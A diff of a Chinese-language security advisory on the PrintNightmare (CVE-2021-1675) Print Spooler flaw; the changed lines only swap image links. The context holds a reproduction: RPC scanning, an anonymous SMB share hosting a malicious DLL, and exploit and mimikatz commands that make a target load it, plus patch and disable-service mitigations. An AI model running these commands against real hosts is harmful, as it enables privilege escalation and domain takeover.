@@ -67,7 +67,7 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/iciaX2AzlFoVicsysTS4xsBxK7nGibNYbud0Tf6VicDlTs588KmyM8NxqYFuDX59ck0ORExDtoWeSVDC9CMmnZpt2jw/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/ed130f9642942c617d73c0968aaf2a72046ea4e0f66562b05abd8dd6955f4a73.gif)
 
 Windows Print Spooler 权限提升漏洞（PrintNightmare）
 
@@ -95,7 +95,7 @@ Windows Print Spooler 权限提升漏洞（PrintNightmare）
 
 4.2 临时防护措施
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c02b870b6ec8925513b7017f272cb33aa2174854ca70ef13d6ec9af72be7b7fc.gif)
 
 **壹**
 
@@ -107,7 +107,7 @@ Windows Print Spooler 权限提升漏洞（PrintNightmare）
 
     Print Spooler 是 Windows 系统中用于管理打印相关事务的服务，在 Windows 系统中用于后台执行打印作业并处理与打印机的交互，管理所有本地和网络打印队列及控制所有打印工作。该服务对应的进程 spoolsv.exe 以 SYSTEM 权限执行，其设计中存在的一个严重缺陷，由于 SeLoadDriverPrivilege 中鉴权存在代码缺陷，参数可以被攻击者控制，普通用户可以通过 RPC 触发 RpcAddPrinterDrive 绕过安全检查并写入恶意驱动程序。如果一个域中存在此漏洞，域中普通用户即可通过连接域控 Spooler 服务，向域控中添加恶意驱动，从而控制整个域环境。  
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c02b870b6ec8925513b7017f272cb33aa2174854ca70ef13d6ec9af72be7b7fc.gif)
 
 **贰**
 
@@ -158,7 +158,7 @@ Windows Print Spooler 权限提升漏洞（PrintNightmare）
 - Windows 10 Version 1809 for x64-based Systems  
 - Windows 10 Version 1809 for 32-bit Systems
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c02b870b6ec8925513b7017f272cb33aa2174854ca70ef13d6ec9af72be7b7fc.gif)
 
 **叁**
 
@@ -171,7 +171,7 @@ Windows Print Spooler 权限提升漏洞（PrintNightmare）
 1：首先我们搭建一个 SMB 匿名共享，放我们的恶意 dll 文件。  
 2：然后执行利用工具，工具运行后会先检测 C:\Windows\System32\DriverStore\FileRepository 目录下 ntprint.inf_amd64_xx 文件名，自动替换。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nTeObSXenuRWwpkFybSftou9SRzTh7nJBt3yDUcomniaic1TiaRqib7ib1AA/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/bdcb6c14b398200902a1188e03f86e270241048f077f102ca6f01bf8c73b33d0.png)
 
 *   然后远程拉取我们设置的匿名共享的恶意 dll 文件
     
@@ -185,7 +185,7 @@ Windows Print Spooler 权限提升漏洞（PrintNightmare）
 
 python3 rpcdump.py @10.211.55.14 | grep MS-RPRN
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nic11FcBNlH3jlUXd9ayRSt1DADia3pdeLicOVT0LVXkkfdKC9ibbVtUgLA/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/9ddcb8551d3272a736ca4658febbc977b345a8aa0929b63395718e6b2a54f498.png)
 
 ### 创建匿名 SMB 共享
 
@@ -207,7 +207,7 @@ REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_
 python3 CVE-2021-1675.py xie.com/test:P@ss1234@10.211.55.14 '\\10.211.55.7\share\1.dll'
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nFDIc9kRTSEE3gcgEPcxn4SiakzOP4lyNicSicU929TJqrQLBHbIH4HBHg/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/3917ef54bc644998a0203f006363e099388c1b13123d9cd5c25d5e2531d2f1dc.png)
 
 **使用 mimikatz 攻击**
 
@@ -216,11 +216,11 @@ mimikatz.exe
 misc::printnightmare /server:10.211.55.14 /library:\\10.211.55.7\share\1.dll
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cvBYd6PeAZmHLs8ey3Rw3nDtLpdEVZn6EGZ44rBzAgC3rMA70Etlicyl4mx9jr197KYX2VxebkicHg/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/921aaf441cafa66a13ad8a235438d00565bfe0df48d81b37e3baa6745cfdc9d1.png)
 
 实战测试攻击 Windows Server2016、2019 均能成功上线。Server2012 只能上传恶意 dll，不能执行上线，08 未攻击成功。
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/zibb4iaicdznzDBHw6juG8h2mltoSZY29HYr3M3VU05Z1V3ZxGfAB3uNHYs4ahQXkcYic9icnZ26VFIhibl0Anm9kib8Q/640)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c02b870b6ec8925513b7017f272cb33aa2174854ca70ef13d6ec9af72be7b7fc.gif)
 
 **肆**
 
@@ -245,11 +245,11 @@ https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675
 若相关用户暂时无法进行补丁更新，可通过禁用 Print Spooler 服务来进行缓解：  
 一：在服务应用（services.msc）中找到 Print Spooler 服务。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fZde99sicNvkmkH1WNSic1MRIUzhiakrc9wKyib4mDxmcJfq240zXpKhbSUyNxibib1voQnojd3GKibaE3w/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/6819e72dd3f31a47207ab1164de19521c95a49c57d0bd930ae1a152ddd45a500.png)
 
 二：停止运行服务，同时将 “启动类型” 修改为“禁用”。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fZde99sicNvkmkH1WNSic1MRp6SBiaPibtY0ARmxUrsX2ln1BYOauiaAsRyAMnwasC0sITUQRI8jkG30A/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/99b5b9300d3add9248c6f4628493983f81a43fb583dd107e3e8504d4fabbb988.png)
 
 参考：
 
